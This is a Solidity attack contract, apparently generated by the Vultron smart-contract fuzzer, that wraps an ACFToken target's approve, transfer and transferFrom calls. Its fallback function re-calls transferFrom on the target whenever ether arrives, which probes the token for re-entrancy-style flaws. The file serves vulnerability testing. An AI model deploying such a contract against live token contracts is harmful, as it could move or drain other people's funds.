pragma solidity ^0.4.19;

import "/home/osboxes/Develop/vultron/contracts/ACFToken.sol";

contract Attack_ACFToken1 {

  ACFToken public target_contract;

  function Attack_ACFToken1(address _targetContract) public payable {
      target_contract = ACFToken(_targetContract);
  } 

  function vultron_approve(address _spender, uint256 _value) public {
    target_contract.approve(_spender, _value);
  } 

  function vultron_transferFrom(address _from, address _to, uint256 _value) public {
    target_contract.transferFrom(_from, _to, _value);
  } 

  function vultron_transfer(address _to, uint256 _value) public {
    target_contract.transfer(_to, _value);
  } 

  function() public payable {
    target_contract.transferFrom(this,  this,  10000);
  }
} 
